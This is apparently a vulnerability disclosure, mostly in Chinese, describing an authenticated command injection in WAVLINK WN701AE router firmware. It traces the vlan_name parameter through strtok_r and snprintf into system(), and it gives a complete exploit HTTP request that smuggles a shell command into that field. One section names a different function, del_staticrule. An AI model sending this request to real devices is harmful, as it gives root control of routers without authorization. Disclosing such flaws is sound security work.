# WAVLINK WN701AE Router

-  Vendor: WAVLINK
-  Product: WL-WN701AE
-  Firmware Version: M01AE_V260105
-  Vulnerability Type:Authenticated Command Injection

# Description

WAVLINK WN701AE 固件（版本 WAVLINK-WN701AE-WO-M01AE_V260105-FM-BY.bin）ioos Web 后端存在命令注入漏洞。del_vlan_group 未对 vlan_name 参数过滤即拼接进 system() 执行命令，已认证攻击者可通过注入任意系统命令实现 root 权限代码执行。

## Impact

利用 del_staticrule 漏洞命令注入漏洞在设备上以 root获取权限执行任意命令，从而完全控制路由器。可造成：窃取与篡改网络流量、修改固件配置实现持久化后门、发起内网横向渗透，或将大量设备纳入僵尸网络发起攻击。

## Vulnerability Details

在 del_vlan_group函数 sub_4113D4中 ，在检测登录后，用户可控参数 vlan_name,在strcpy(v8, v4); --> 进入for循环 i = (const char *)strtok_r(v8, ";", v10); 对输入字符串用 '  ; ' 进行分割然后依次给到i ,然后通过 snprintf(v9, 256, "vlan_group.sh del \"%s\"", i);，最后通过system(v9);执行导致命令注入





<img width="1209" height="221" alt="图片" src="https://github.com/user-attachments/assets/10c1806d-5e4f-42f0-a806-a5a5b235eec2" />




<img width="1559" height="1348" alt="图片" src="https://github.com/user-attachments/assets/ac465c8b-92ad-4f5e-bf4b-fb83570152d8" />


<img width="1157" height="674" alt="图片" src="https://github.com/user-attachments/assets/42d000ac-5f74-4f9a-99e9-6a8421c34378" />


# 漏洞利用

**exp**

其中token需要登录获取

```http
GET /protocol.csp?fname=net&opt=del_vlan_group&function=set&vlan_name=aa%22%20%7C%20touch%20%2Fpwned_vlan%20%23&token=6053DFA50DD9985A95F0714AF96DE8E4 HTTP/1.1

Host: 192.168.10.3

Accept: application/json, text/javascript, */*; q=0.01

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

X-Requested-With: XMLHttpRequest

Referer: http://192.168.10.3/html/index.html?v=1786177330489

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close
```


<img width="1628" height="480" alt="图片" src="https://github.com/user-attachments/assets/70f34924-464b-40dc-9e2a-1b286824cbfc" />


